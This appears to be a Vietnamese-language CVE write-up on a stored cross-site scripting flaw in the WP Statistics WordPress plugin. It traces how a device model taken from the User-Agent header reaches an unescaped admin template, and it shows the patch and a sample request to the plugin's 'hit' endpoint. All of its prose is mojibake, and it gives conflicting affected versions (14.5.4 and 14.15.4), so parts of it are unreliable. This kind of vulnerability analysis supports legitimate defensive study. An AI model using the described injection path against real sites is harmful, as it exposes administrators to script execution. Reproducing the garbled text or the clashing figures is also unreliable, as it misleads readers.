# CVE-2025-9816 Analysis & POC


<!--more-->

## CVE & Basic Info

**WP Statistics â€“ The Most Popular Privacy-Friendly Analytics Plugin** cho WordPress máº¯c lá»— há»•ng **Stored Cross-Site Scripting (XSS)** qua **User-Agent Header** trong táº¥t cáº£ cÃ¡c phiÃªn báº£n tá»« trÆ°á»›c Ä‘áº¿n **14.5.4** (bao gá»“m cáº£ 14.5.4). NguyÃªn nhÃ¢n xuáº¥t phÃ¡t tá»« viá»‡c **kiá»ƒm tra vÃ  lá»c dá»¯ liá»‡u Ä‘áº§u vÃ o** cÅ©ng nhÆ° **thoÃ¡t dá»¯ liá»‡u Ä‘áº§u ra** chÆ°a Ä‘áº§y Ä‘á»§.

Lá»— há»•ng nÃ y cho phÃ©p **káº» táº¥n cÃ´ng khÃ´ng cáº§n xÃ¡c thá»±c** chÃ¨n cÃ¡c Ä‘oáº¡n mÃ£ JavaScript Ä‘á»™c háº¡i vÃ o há»‡ thá»‘ng. CÃ¡c Ä‘oáº¡n mÃ£ nÃ y sáº½ Ä‘Æ°á»£c thá»±c thi má»—i khi ngÆ°á»i dÃ¹ng truy cáº­p vÃ o trang cÃ³ chá»©a dá»¯ liá»‡u Ä‘Ã£ bá»‹ chÃ¨n mÃ£ Ä‘á»™c, gÃ¢y ra nguy cÆ¡ nghiÃªm trá»ng cho báº£o máº­t vÃ  quyá»n riÃªng tÆ°.

* **CVE ID**: [CVE-2025-9816](https://www.cve.org/CVERecord?id=CVE-2025-9816)
* **Vulnerability Type**: Cross Site Scripting (XSS)
* **Affected Versions**: <= 14.15.4
* **Patched Versions**: 14.15.5
* **CVSS severity**: Medium (7.1)
* **Required Privilege**: Unauthenticated
* **Product**: [WordPress WP Statistics Plugin](https://wordpress.org/plugins/wp-statistics/)

## Requirements

* **Local WordPress & Debugging**: [Local WordPress and Debugging](https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/).
* **Plugin versions** - **WP Statistics**: **v14.15.4** (vulnerable) vÃ  **v14.15.5** (patched).
* **Diff tool** - [**Meld**](https://meldmerge.org/) hoáº·c báº¥t ká»³ cÃ´ng cá»¥ so sÃ¡nh (diff) nÃ o Ä‘á»ƒ kiá»ƒm tra vÃ  so sÃ¡nh khÃ¡c biá»‡t giá»¯a hai phiÃªn báº£n.

## Analysis

TÃ´i Ä‘Ã£ thiáº¿u sÃ³t trong quÃ¡ trÃ¬nh thu tháº­p thÃ´ng tin vá» CVE nÃ y, [references](https://plugins.trac.wordpress.org/browser/wp-statistics/tags/14.15.3/includes/admin/templates/pages/devices/models.php#L31) cá»§a [https://www.cve.org/CVERecord?id=CVE-2025-9816](https://www.cve.org/CVERecord?id=CVE-2025-9816) chá»‰ rÃµ nÆ¡i lá»— há»—ng xáº£y ra: `includes/admin/templates/pages/devices/models.php`{: .filepath}

NhÆ°ng tÃ´i Ä‘Ã£ bá» qua nÃ³ vÃ  sá»­ dá»¥ng [**Meld**](https://meldmerge.org/) Ä‘á»ƒ so sÃ¡nh code. Do code thay Ä‘á»•i khÃ¡ nhiá»u nÃªn tÃ´i Ä‘Ã£ chá»§ Ä‘á»™ng tÃ¬m cÃ¡c file liÃªn quan Ä‘áº¿n **user-agent**

{{< figure src="dif1.png" caption="Diff â€” so sÃ¡nh thay Ä‘á»•i mÃ£ giá»¯a báº£n vulnerable vÃ  báº£n vÃ¡" >}}

VÃ  code thay Ä‘á»•i trong `UserAgent.php`{: .filepath} lÃ m tÃ´i tin ráº±ng lá»— há»—ng thá»±c sá»± xáº£y ra á»Ÿ Ä‘Ã¢y.

{{< figure src="dif2.png" caption="Diff â€” Sá»± thay Ä‘á»•i mÃ£ trong UserAgent.php" >}}

NÃ³ lÃ m tÃ´i tá»‘n khÃ¡ nhiá»u thá»i gian nhÆ°ng chÆ°a thá»ƒ phÃ¢n tÃ­ch Ä‘Æ°á»£c. Tuy nhiÃªn, viá»‡c nÃ y cÅ©ng giÃºp Ã­ch cho quÃ¡ trÃ¬nh phÃ¢n tÃ­ch.

ğŸ€ May máº¯n thay, dÆ°á»›i sá»± hÆ°á»›ng dáº«n cá»§a cÃ¡c tiá»n bá»‘i, tÃ´i Ä‘Ã£ **focus** vÃ o Ä‘Ãºng vÃ o [**vá»‹ trÃ­ lá»— há»•ng**](https://plugins.trac.wordpress.org/browser/wp-statistics/tags/14.15.3/includes/admin/templates/pages/devices/models.php#L31). NÃªn quÃ¡ trÃ¬nh phÃ¢n tÃ­ch trá»Ÿ nÃªn dá»… dÃ ng hÆ¡n.

> Tip: ÄÃ¢y lÃ  lá»— há»•ng Cross Site Script diá»…n ra á»Ÿ trÃ¬nh duyá»‡t cá»§a náº¡n nhÃ¢n nÃªn ta cáº§n tÃ¬m nÆ¡i render vÃ  tráº£ vá» HTML.

### Patch diff

Lá»— há»•ng xáº£y ra trong file `includes/admin/templates/pages/devices/models.php`{: .filepath} táº¡i dÃ²ng 31.

Trong phiÃªn báº£n **vulnerable**, `$item->model` Ä‘Æ°á»£c in ra HTML nhÆ°ng **khÃ´ng cÃ³ cÆ¡ cháº¿ báº£o vá»‡ nÃ o**

```html
<span title="<?php echo \WP_STATISTICS\Admin_Template::unknownToNotSet($item->model); ?>" class="wps-model-name">
    <?php echo self::isUnknown($item->model) ? esc_html__('Unknown', 'wp-statistics') : $item->model; ?>
</span>
```

Trong phiÃªn báº£n **patched**, `$item->model` Ä‘Ã£ Ä‘Æ°á»£c báº£o vá»‡ báº±ng cÃ¡ch Ä‘áº·t nÃ³ vÃ o `esc_attr()` vÃ  `esc_html()`.

```html
<span title="<?php echo esc_attr(\WP_STATISTICS\Admin_Template::unknownToNotSet($item->model)); ?>" class="wps-model-name">
    <?php echo self::isUnknown($item->model) ? esc_html__('Unknown', 'wp-statistics') : esc_html($item->model); ?>
</span>
```

ğŸ‘‰ Báº£n vÃ¡ bá»• sung lá»›p lá»c Ä‘áº§u vÃ o cho `$item->model`, Ä‘áº£m báº£o nÃ³ sáº½ Ä‘Æ°á»£c **escape** trÆ°á»›c khi in ra HTML.

{{< figure src="dif3.png" caption="Diff â€” Sá»± thay Ä‘á»•i mÃ£ trong models.php" >}}

### Vulnerable code

```html
<?php
use WP_STATISTICS\Helper;
?>

<div class="postbox-container wps-postbox-full">
  <?php if (!empty($data['visitors'])) : ?>
      <div class="o-table-wrapper">
          <table width="100%" class="o-table wps-new-table">
              <thead>
              </thead>
              <tbody>
                  <?php foreach ($data['visitors'] as $item) : ?>
                      <tr>
                          <td class="wps-pd-l">
                              <span title="<?php echo \WP_STATISTICS\Admin_Template::unknownToNotSet($item->model); ?>" class="wps-model-name">
                                  <?php echo self::isUnknown($item->model) ? esc_html__('Unknown', 'wp-statistics') : $item->model; ?>
                              </span>
                          </td>
                      </tr>
                  <?php endforeach; ?>
              </tbody>
          </table>
      </div>
  <?php else : ?>
      <div class="o-wrap o-wrap--no-data wps-center">
          <?php esc_html_e('No recent data available.', 'wp-statistics'); ?>
      </div>
  <?php endif; ?>
</div>
```

Náº¿u `$data` khÃ´ng rá»—ng thÃ¬ duyá»‡t qua `$data` vÃ  hiá»ƒn thá»‹ dá»¯ liá»‡u Ä‘Ã£ thá»‘ng kÃª cá»§a **visitors**, bao gá»“m `model`.
Náº¿u rá»—ng thÃ¬ in ra `No recent data available.`

```php
public static function isUnknown($value)
{
    if (empty($value) or $value == 'Unknown' or $value == __("Unknown", 'wp-statistics')) {
        return true;
    }

    return false;
}

public static function unknownToNotSet($value)
{
    if (self::isUnknown($value)) {
        return __('(not set)', 'wp-statistics');
    }
    return $value;
}
```

`unknownToNotSet()` sáº½ tráº£ vá» `(not set)` náº¿u `$item->model` rá»—ng, `Unknown`, `Unknown` theo tá»«ng ngÃ´n ngá»¯.

`__("Unknown", 'wp-statistics')` sáº½ tÃ¬m báº£n dá»‹ch cá»§a `Unknown` trong file dá»‹ch `.po`/`.mo` cá»§a text domain `wp-statistics`

ğŸ‘‰ KhÃ´ng cÃ³ cÆ¡ cháº¿ báº£o vá»‡ `$item->model`

`$data` khÃ´ng Ä‘Æ°á»£c khá»Ÿi táº¡o trong file nÃ y nÃªn cháº¯c cháº¯n ráº¯ng nÃ³ Ä‘Æ°á»£c khá»Ÿi táº¡o tá»« nÆ¡i khÃ¡c vÃ  `models.php`{: .filepath} sáº½ sá»­ dá»¥ng nÃ³ khi Ä‘Æ°á»£c include.
Ta cÃ³ thá»ƒ search báº±ng tá»« khÃ³a `models.php` Ä‘á»ƒ tÃ¬m Ä‘áº¿n nÆ¡i gá»i Ä‘áº¿n nÃ³, nhÆ°ng á»Ÿ Ä‘Ã¢y nÃ³ Ä‘Æ°á»£c **include** Ä‘á»™ng. Thay vÃ o Ä‘Ã³, ta search vá»›i tÃªn thÆ° má»¥c chá»©a nÃ³ `pages/devices`.

{{< figure src="search1.png" caption="Diff â€” CÃ¡ch cÃ¡c template Ä‘Æ°á»£c gá»i Ä‘á»™ng" >}}

ğŸ‘‰ `models.php`{: .filepath} sáº½ Ä‘Æ°á»£c gá»i Ä‘á»™ng trong hÃ m `render()` cá»§a class `TabsView`

```php
class TabsView extends BaseTabView
{
    public function render()
    {
        $currentTab  = $this->getCurrentTab();
        $data        = $this->getTabData();

        $args = [
            'title'           => esc_html__('Devices', 'wp-statistics'),
            'pageName'        => Menus::get_page_slug('devices'),
            'paged'           => Admin_Template::getCurrentPaged(),
            'custom_get'      => ['tab' => $currentTab],
            'data'            => $data,
            'viewMoreUrlArgs' => ['type' => 'single-' . rtrim($currentTab, 's'), 'from' => Request::get('from'), 'to' => Request::get('to')],
            'tabs'            => [
                [
                    'link'        => Menus::admin_url('devices', ['tab' => 'overview']),
                    'title'       => esc_html__('Overview', 'wp-statistics'),
                ],
                [
                    'link'        => Menus::admin_url('devices', ['tab' => 'browsers']),
                    'title'       => esc_html__('Browsers', 'wp-statistics'),
                ],
                [
                    'link'        => Menus::admin_url('devices', ['tab' => 'platforms']),
                    'title'       => esc_html__('Operating Systems', 'wp-statistics'),
                ],
                [
                    'link'        => Menus::admin_url('devices', ['tab' => 'models']),
                    'title'       => esc_html__('Device Models', 'wp-statistics'),
                ],
                [
                    'link'        => Menus::admin_url('devices', ['tab' => 'categories']),
                    'title'       => esc_html__('Device Categories', 'wp-statistics'),
                ]
            ],
        ];

        Admin_Template::get_template(['layout/header', 'layout/tabbed-page-header', "pages/devices/$currentTab", 'layout/postbox.hide', 'layout/footer'], $args);
    }
}
```

CÃ³ sá»± tÆ°Æ¡ng quan giá»¯a cÃ¡c giÃ¡ trá»‹ trong `$args` vÃ  submenu **Devices**

{{< figure src="submenu.png" caption="Diff â€” Sá»± tÆ°Æ¡ng quan giá»¯a cÃ¡c giÃ¡ trá»‹ trong $args vÃ  submenu Devices" >}}

GiÃ¡ trá»‹ `tab` trong `args` sáº½ tÆ°Æ¡ng á»©ng vá»›i param `tab` trÃªn URL => Pháº¡m vi truy váº¿t náº±m trong submenu **Devices** cá»§a admin panel. Ta cáº§n xÃ¡c Ä‘á»‹nh `$currentTab` Ä‘á»ƒ biáº¿t cÃ¡ch `render()` gá»i Ä‘áº¿n `models.php`{: .filepath} vÃ  `$data` Ä‘á»ƒ inject payload.

**Biáº¿n $currentTab**

```php
// $currentTab  = $this->getCurrentTab();
protected function getCurrentTab()
{
    return Request::get('tab', $this->defaultTab);
}
```

`getCurrentTab()` tráº£ vá» giÃ¡ trá»‹ cá»§a `Request::get()`

```php
// $param='tab'
public static function get($param, $default = false, $return = 'string')
{
    if (empty($_REQUEST[$param])) return $default;

    $value = $_REQUEST[$param];

    if ($return === 'string') {
        return sanitize_text_field($value);
    }

    if ($return === 'url') {
        return sanitize_url($value);
    }

    if ($return === 'number') {
        return intval($value);
    }

    if ($return === 'text') {
        return sanitize_textarea_field($value);
    }

    if ($return === 'bool') {
        return boolval($value);
    }

    if ($return === 'array' && is_array($value)) {
        return array_map('sanitize_text_field', $value);
    }

    return $value;
}
```

ğŸ‘‰ `get()` tráº£ vá» giÃ¡ trá»‹ cá»§a param `'tab'` Ä‘Æ°á»£c láº¥y tá»« `$_REQUEST['tab']`, vÃ­ dá»¥:

```
wp-admin/admin.php?page=wps_devices_page&tab=models <-- $value=models
```

ğŸ‘‰ `$currentTab` lÃ  giÃ¡ trá»‹ cá»§a param `tab`

**Biáº¿n $data**

```php
// $data = $this->getTabData();
protected function getTabData()
{
    $currentTab     = ucwords($this->getCurrentTab(), '-');
    $tabDataMethod  = 'get' . str_replace('-', '', $currentTab) . 'Data'; // getModelsData

    if (!method_exists($this, $tabDataMethod)) {
        // Filter to add data for locked tab
        return apply_filters("wp_statistics_{$this->getCurrentPage()}_{$this->getCurrentTab()}_data", []);
    };

    return $this->$tabDataMethod();
}
```

HÃ m `getTabData()` Ä‘Æ°á»£c Ä‘á»‹nh nghÄ©a trong abstract class `BaseTabView`, Ä‘Æ°á»£c class `TabsView` káº¿ thá»«a nÃªn `$data = $this->getTabData();` lÃ  cÃ¡ch `TabsView` gá»i hÃ m thá»«a hÆ°á»Ÿng tá»« `BaseTabView`

Ta Ä‘ang focus vÃ o **model** nÃªn tab á»Ÿ Ä‘Ã¢y lÃ  `models`, `$tabDataMethod` sáº½ cÃ³ giÃ¡ trá»‹ `'getModelsData'`

Náº¿u `getModelsData()` khÃ´ng tá»“n táº¡i thÃ¬ filter hook `wp_statistics_wps_devices_page_models_data` Ä‘Æ°á»£c Ã¡p dá»¥ng. NhÆ°ng á»Ÿ Ä‘Ã¢y `getModelsData()` Ä‘Æ°á»£c Ä‘á»‹nh nghÄ©a trong class `TabsView`, `$this` cÅ©ng chÃ­nh lÃ  `TabsView` nÃªn `getModelsData()` cá»§a `TabsView` Ä‘Æ°á»£c gá»i.

```php
public function __construct()
{
    parent::__construct();

    $this->dataProvider = new DevicesDataProvider([
        'per_page' => 10,
        'page'     => Admin_Template::getCurrentPaged()
    ]);
}

public function getModelsData()
{
    return $this->dataProvider->getModelsData();
}
```

`getModelsData()` tráº£ vá» káº¿t quáº£ cá»§a `getModelsData()` trong class `DevicesDataProvider`.

```php
public function __construct($args)
{
    $this->args = $args;

    $this->visitorsModel = new VisitorsModel();
}

public function getModelsData()
{
    $args = array_merge($this->args, [
        'field'    => 'model',
        'group_by' => ['model']
    ]);

    $visitors = $this->visitorsModel->getVisitorsDevices($args);

    if (! empty($visitors)) {
        $visitors = array_reduce($visitors, function ($carry, $item) {
            // Trim whitespace and default empty models to 'Unknown'
            $model = trim($item->model ?? '');

            if ($model === '') {
                $model = 'Unknown';
            }

            if (isset($carry[$model])) {
                $carry[$model]->visitors += $item->visitors;
            } else {
                $carry[$model] = (object)[
                    'model'    => $model,
                    'visitors' => $item->visitors
                ];
            }
            return $carry;
        }, []);
    }

    return [
        'visitors' => $visitors,
        'total'    => $this->visitorsModel->countColumnDistinct($args),
        'visits'   => $this->visitorsModel->countColumnDistinct(array_merge($args, ['field' => 'ID'])),
    ];
}
```

Ta focus vÃ o `$visitors` vÃ¬ nÃ³ Ä‘Æ°á»£c láº·p vÃ  hiá»ƒn thá»‹ ra HTML trong `models.php`{: .filepath}

```php
<?php foreach ($data['visitors'] as $item) : ?>
```

`$visitors` lÃ  káº¿t quáº£ tráº£ vá» cá»§a hÃ m `getVisitorsDevices()` thuá»™c class `VisitorsModel`

```php
public function getVisitorsDevices($args = [])
{
    $args = $this->parseArgs($args, [
        'field'          => 'agent',
        'date'           => '',
        'where_not_null' => '',
        'group_by'       => [],
        'order_by'       => 'visitors',
        'order'          => 'DESC',
        'per_page'       => '',
        'page'           => 1,
    ]);

    $result = Query::select([
        $args['field'],
        'COUNT(visitor.ID) AS `visitors`',
    ])
        ->from('visitor')
        ->whereDate('last_counter', $args['date'])
        ->whereNotNull($args['where_not_null'])
        ->groupBy($args['group_by'])
        ->orderBy($args['order_by'], $args['order'])
        ->perPage($args['page'], $args['per_page'])
        ->getAll();

    return $result ? $result : [];
}
```

`getVisitorsDevices()` truy váº¥n `from('visitor')` cá»¥ thá»ƒ lÃ  báº£ng `wp_statistics_visitor` trong database rá»“i tráº£ vá» káº¿t quáº£.

```sql
mysql> show tables;
+-------------------------------------+
| Tables_in_wordpress                 |
+-------------------------------------+          
| wp_statistics_visitor               |
| wp_other_table                      |
| wp_users                            |
+-------------------------------------+
```

Báº£ng `wp_statistics_visitor` bao gá»“m cÃ¡c trÆ°á»ng sau:

```sql
mysql> desc wp_statistics_visitor;
+----------------+-----------------+------+-----+---------+----------------+
| Field          | Type            | Null | Key | Default | Extra          |
+----------------+-----------------+------+-----+---------+----------------+
| ID             | bigint          | NO   | PRI | NULL    | auto_increment |
| last_counter   | date            | NO   | MUL | NULL    |                |
| referred       | text            | NO   |     | NULL    |                |
| agent          | varchar(180)    | NO   | MUL | NULL    |                |
| platform       | varchar(180)    | YES  | MUL | NULL    |                |
| version        | varchar(180)    | YES  | MUL | NULL    |                |
| device         | varchar(180)    | YES  | MUL | NULL    |                |
| model          | varchar(180)    | YES  | MUL | NULL    |                |
| UAString       | varchar(190)    | YES  |     | NULL    |                |
| ip             | varchar(60)     | NO   | MUL | NULL    |                |
| location       | varchar(10)     | YES  | MUL | NULL    |                |
| user_id        | bigint          | NO   |     | NULL    |                |
| hits           | int             | YES  |     | NULL    |                |
| honeypot       | int             | YES  |     | NULL    |                |
| city           | varchar(100)    | YES  |     | NULL    |                |
| region         | varchar(100)    | YES  |     | NULL    |                |
| continent      | varchar(50)     | YES  |     | NULL    |                |
| source_channel | varchar(50)     | YES  |     | NULL    |                |
| source_name    | varchar(100)    | YES  |     | NULL    |                |
| first_page     | bigint unsigned | YES  |     | NULL    |                |
| first_view     | datetime        | YES  |     | NULL    |                |
| last_page      | bigint unsigned | YES  |     | NULL    |                |
| last_view      | datetime        | YES  |     | NULL    |                |
+----------------+-----------------+------+-----+---------+----------------+
```

ğŸ‘‰ NhÆ° váº­y, `$data` lÃ  chá»©a káº¿t quáº£ tráº£ vá» cá»§a truy váº¥n Ä‘áº¿n báº£ng `wp_statistics_visitor`(chá»©a **model** cá»§a **visitor**) vÃ  má»™t sá»‘ giÃ¡ trá»‹ khÃ¡c.
Ta cáº§n tÃ¬m cÃ¡ch Ä‘á»ƒ lÆ°u **XSS payload** vÃ o trÆ°á»ng **model** cá»§a `wp_statistics_visitor`.

May máº¯n thay, trong lÃºc cháº­t váº­t vá»›i vá»‹ trÃ­ sink khÃ´ng chÃ­nh xÃ¡c lÃºc ban Ä‘áº§u, tÃ´i Ä‘Ã£ tÃ¬m ra cÃ¡ch plugin lÆ°u trá»¯ thÃ´ng tin cá»§a **visitor** vÃ o `wp_statistics_visitor`.

```php
register_rest_route('wp-statistics/v2', '/' . 'hit', array(
    array(
        'methods'             => \WP_REST_Server::CREATABLE,
        'callback'            => array($this, 'hit_callback'),
        'args'                => self::require_params_hit(),
        'permission_callback' => function (\WP_REST_Request $request) {
            return $this->checkSignature($request);
        }
    )
));
```

Plugin Ä‘Ã£ Ä‘Äƒng kÃ½ má»™t **REST API** vá»›i endpoint `/wp-json/wp-statistics/v2/hit`, nháº­n `hit_callback()` lÃ m callback.
NhÆ°ng Ä‘á»ƒ sá»­ dá»¥ng Ä‘Æ°á»£c endpoint nÃ y, cáº§n pháº£i vÆ°á»£t qua `checkSignature`

```php
protected function checkSignature($request)
{
    if (Helper::isRequestSignatureEnabled()) {
        $signature = $request->get_param('signature');
        $payload   = [
            $request->get_param('source_type'),
            (int)$request->get_param('source_id'),
        ];

        if (!Signature::check($payload, $signature)) {
            return new \WP_Error('rest_forbidden', __('Invalid signature', 'wp-statistics'), array('status' => 403));
        }
    }

    return true;
}
```

CÃ¡c param nÃ y sáº½ tá»± Ä‘á»™ng cung cáº¥p khi ta truy cáº­p trang web => luÃ´n true.
Khi báº¯t request báº±ng **BurpSuite** ta sáº½ tháº¥y rÃµ Ä‘iá»u Ä‘Ã³

```http
POST /wp-json/wp-statistics/v2/hit HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; model_here) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36

wp_statistics_hit=1&source_type=home&source_id=0&search_query=&signature=787b07b8979cb982ec89a4f103a68081&endpoint=hit&referred=&page_uri=Lw%3D%3D
```

NhÆ° váº­y, ta khÃ´ng áº§n quan tÃ¢m Ä‘áº¿n `permission_callback`.

Quay trá»Ÿ láº¡i vá»›i `hit_callback()`, hÃ m chÃ­nh xá»­ lÃ½ viá»‡c lÆ°u trá»¯ thÃ´ng tin **visitor**.

```php
public function hit_callback()
{
    $statusCode = false;

    try {
        Helper::validateHitRequest();
        Hits::record();

        $responseData['status'] = true;

    } catch (Exception $e) {
        $responseData['status'] = false;
        $responseData['data']   = $e->getMessage();
        $statusCode             = $e->getCode();
    }

    $response = rest_ensure_response($responseData);

    if ($statusCode) {
        $response->set_status($statusCode);
    }

    $response->set_headers(array(
        'Cache-Control' => 'no-cache',
    ));

    return $response;
}
```

Lá»—i liÃªn quan Ä‘áº¿n user-agent header vÃ  model Ä‘áº·t trong nÃ³, ta cáº§n focus, tÃ¬m cÃ¡ch Ä‘á»ƒ thÃªm model vÃ o database. [ÄÃ¢y](https://51degrees.com/blog/understanding-user-agent-string#Unpacking%20the%20User%20Agent%20string) lÃ  cÃº phÃ¡p cá»§a user-agent cÃ³ model.

```php
// Helper::validateHitRequest();
public static function validateHitRequest()
{
    $isValid = Request::validate([
        'page_uri'     => [
            'required'        => true,
            'nullable'        => true,
            'type'            => 'string',
            'encoding'        => 'base64',
            'invalid_pattern' => self::injectionPatterns()
        ],
        'search_query' => [
            'required'        => true,
            'nullable'        => true,
            'type'            => 'string',
            'encoding'        => 'base64',
            'invalid_pattern' => self::injectionPatterns()
        ],
        'source_id'    => [
            'type'     => 'number',
            'required' => true,
            'nullable' => false
        ],
        'referred'     => [
            'required' => true,
            'nullable' => true,
            'type'     => 'url',
            'encoding' => 'base64'
        ],
    ]);

    if (!$isValid) {
        do_action('wp_statistics_invalid_hit_request', $isValid, IP::getIP());
        throw new ErrorException(esc_html__('Invalid hit/online request.', 'wp-statistics'));
    }

    return true;
}
```

`validateHitRequest()` lÃ  hÃ m dÃ¹ng Ä‘á»ƒ validate cÃ¡c params Ä‘Æ°á»£c truyá»n vÃ o body cá»§a request Ä‘áº¿n `hit` á»Ÿ trÃªn, cÃ¡c param nÃ y Ä‘Æ°á»£c plugin cung cáº¥p nÃªn chá»‰ cáº§n tÃ¡i sá»­ dá»¥ng láº¡i nÃ³ => khÃ´ng áº£nh hÆ°á»Ÿng gÃ¬ Ä‘áº¿n model trong user-agent header.

```php
// Hits::record();
public static function record($visitorProfile = null)
{
    if (!$visitorProfile) {
        $visitorProfile = new VisitorProfile();
    }

    /**
        * Record Pages
        */
    $pageId = false;
    if (Pages::active()) {
        $pageId = Pages::record($visitorProfile);
    }

    /**
        * Record Visitor Detail
        */
    $visitorId = false;
    if (Visitor::active()) {
        $visitorId = Visitor::record($visitorProfile, ['page_id' => $pageId]);
    }

    // other logic
}
```

Tá»« khÃ³a `record` lÃ m tÃ´i liÃªn tÆ°á»Ÿng Ä‘áº¿n viá»‡c quay video mÃ n hÃ¬nh vÃ  lÆ°u trá»¯ nÃ³ vÃ o bá»™ nhá»›. TÆ°Æ¡ng tá»±, trong trÆ°á»ng há»£p nÃ y sáº½ lÆ°u trá»¯ thÃ´ng tin visitor vÃ o database.

Náº¿u `visitor=null` tá»©c chÆ°a tá»“n táº¡i thÃ¬ gá»i Ä‘áº¿n `Visitor::active()` Ä‘á»ƒ kiá»ƒm tra vÃ  thá»±c hiá»‡n `record()` cá»§a **Visitor**

```php
public static function active()
{
    return (has_filter('wp_statistics_active_visitors')) ? apply_filters('wp_statistics_active_visitors', true) : true;
}
```

HÃ m `active()` sáº½ tráº£ vá» **true máº·c Ä‘á»‹nh**.

* Náº¿u trong plugin Ä‘Ã£ `add_filter('wp_statistics_active_visitors', 'my_function')`, thÃ¬ giÃ¡ trá»‹ tráº£ vá» sáº½ Ä‘Æ°á»£c thay Ä‘á»•i theo káº¿t quáº£ cá»§a filter.
* Náº¿u khÃ´ng cÃ³ filter nÃ o, thÃ¬ nÃ³ chá»‰ tráº£ vá» **true**.

Search vá»›i hook name `wp_statistics_active_visitors` ta khÃ´ng tháº¥y filter nÃ o Ä‘Æ°á»£c add cáº£

{{< figure src="search2.png" caption="Káº¿t quáº£ tÃ¬m kiáº¿m hook name wp_statistics_active_visitors" >}}

ğŸ‘‰ `active()` luÃ´n true => `Visitor::record()` Ä‘Æ°á»£c gá»i.

```php
 public static function record($visitorProfile, $arg = array())
{
    global $wpdb;

    // Define the array of defaults
    $defaults = array(
        'location'         => '',
        'exclusion_match'  => false,
        'exclusion_reason' => '',
        'page_id'          => 0
    );

    $userAgent    = $visitorProfile->getUserAgent(); <-- focus
    $same_visitor = $visitorProfile->isIpActiveToday();

    // If we have a new Visitor in Day
    if (!$same_visitor) {

        // Prepare Visitor information
        $visitor = array(
            'agent'          => $userAgent->getBrowser(),
            'platform'       => $userAgent->getPlatform(),
            'version'        => $userAgent->getVersion(),
            'device'         => $userAgent->getDevice(),
            'model'          => $userAgent->getModel(), <-- focus
            // other logic
        );

        $visitor = apply_filters('wp_statistics_visitor_information', $visitor);

        //Save Visitor TO DB
        $visitor_id = self::save_visitor($visitor, $visitorProfile);

    } else {
    }
}
```

Plugin láº¥y user-agent tá»« http request vÃ  gÃ¡n vÃ o `$userAgent`

{{< figure src="debug1.png" caption="Debug cho $userAgent" >}}

Sau Ä‘Ã³ gÃ¡n vÃ o máº£ng `$visitor` vÃ  lÆ°u thÃ´ng tin **visitor** vÃ o database báº±ng hÃ m `save_visitor()`. Ta cáº§n focus vÃ o dÃ²ng code chá»©a model:

```php
'model' => $userAgent->getModel()
```

`'model'` lÃ  giÃ¡ trá»‹ tráº£ vá» cá»§a `getModel()`

```php
public function getModel()
{
    $model = '';

    if (! empty($this->deviceDetector)) {
        $brand  = $this->deviceDetector->getBrandName();
        $device = $this->deviceDetector->getModel();

        if (!empty($device)) {
            $words = explode(' ', trim($device));
            $device = $words[0] ?? null;

            if (! empty($device) && ctype_digit($device)) {
                $device = '';
            }
        }

        $model = trim($brand . ' ' . $device);
    }      

    return $model ?? null;
}
```

CÃ¡c logic trong `getModel()` liÃªn quan Ä‘áº¿n `deviceDetector` Ä‘Æ°á»£c khá»Ÿi táº¡o trong `__construct`, ta cáº§n tÃ¬m hiá»ƒu nÃ³ lÃ  gÃ¬:

```php
class UserAgentService
{
    public function __construct()
    {
        try {
            // Get HTTP User Agent
            $userAgent = UserAgent::getHttpUserAgent();

            // Initialize DeviceDetector with the user agent string
            $this->deviceDetector = new \WP_Statistics\Dependencies\DeviceDetector\DeviceDetector($userAgent);
            $this->deviceDetector->parse();

        } catch (Exception $e) {
            // In case of an error, set deviceDetector to null
            $this->deviceDetector = null;
        }
    }
}
```

`deviceDetector` lÃ  má»™t thá»ƒ hiá»ƒn cá»§a class `DeviceDetector`, khá»Ÿi táº¡o vá»›i tham sá»‘ `$userAgent` lÃ  user-agent Ä‘Æ°á»£c láº¥y tá»« HTTP request.

{{< figure src="debug2.png" caption="Debug cho $userAgent" >}}

```php
class DeviceDetector 
{
    public function __construct(string $userAgent = '', ?ClientHints $clientHints = null)
    {
        if ('' !== $userAgent) {
            $this->setUserAgent($userAgent);
        }

        if ($clientHints instanceof ClientHints) {
            $this->setClientHints($clientHints);
        }

        $this->addClientParser(new FeedReader());
        $this->addClientParser(new MobileApp());
        $this->addClientParser(new MediaPlayer());
        $this->addClientParser(new PIM());
        $this->addClientParser(new Browser());
        $this->addClientParser(new Library());

        $this->addDeviceParser(new HbbTv());
        $this->addDeviceParser(new ShellTv());
        $this->addDeviceParser(new Notebook());
        $this->addDeviceParser(new Console());
        $this->addDeviceParser(new CarBrowser());
        $this->addDeviceParser(new Camera());
        $this->addDeviceParser(new PortableMediaPlayer());
        $this->addDeviceParser(new Mobile());

        $this->addBotParser(new Bot());
    }
}
```

`DeviceDetector` set user-agent vÃ  thÃªm **parser** cho tá»«ng loáº¡i **device/app**, cÃ¡c parser nÃ y cÃ³ thá»ƒ liÃªn quan Ä‘áº¿n `$this->deviceDetector->parse();` Ä‘Æ°á»£c gá»i á»Ÿ trÃªn.

Ta tÃ¬m hiá»ƒu thá»­ Ä‘á»‘i sá»‘ `new Mobile()`

```php
class Mobile extends AbstractDeviceParser
{
    /**
     * @var string
     */
    protected $fixtureFile = 'regexes/device/mobiles.yml';

    /**
     * @var string
     */
    protected $parserName = 'mobile';
}
```

`$fixtureFile` trong `Mobile` lÃ  Ä‘Æ°á»ng dáº«n Ä‘áº¿n file chá»©a cÃ¡c regex, Ä‘á»ƒ hiá»ƒu rÃµ hÆ¡n, ta nháº¥n tá»• há»£p phÃ­m <kbd>Ctrl</kbd> + <kbd>Shift</kbd> + <kbd>P</kbd> vÃ  search vá»›i `regexes/device/mobiles.yml`

{{< figure src="search3.png" caption="TÃ¬m kiáº¿m file regexes/device/mobiles.yml" >}}
*TÃ¬m kiáº¿m file regexes/device/mobiles.yml*

Ná»™i dung file `mobile.yml`{: .filepath}:

```yml
# Gol Mobile (gol-mobile.com)
Gol Mobile:
  regex: '(?:F10_PRIME|F3Prime|F9_PLUS|TEAM_7_3G)(?:[);/ ]|$)'
  device: 'smartphone'
  models:
    - regex: 'F10_PRIME'
      model: 'F10 Prime'
    - regex: 'F3Prime'
      model: 'F3 Prime'
    - regex: 'F9_PLUS'
      model: 'F9 Plus'
    - regex: 'TEAM_7_3G'
      device: 'tablet'
      model: 'Team 7.0 3G'

# Goly: 
Goly:
  regex: 'Goly[ _-]'      # match khi UA cÃ³ "Goly-" hoáº·c "Goly_" hoáº·c "Goly "
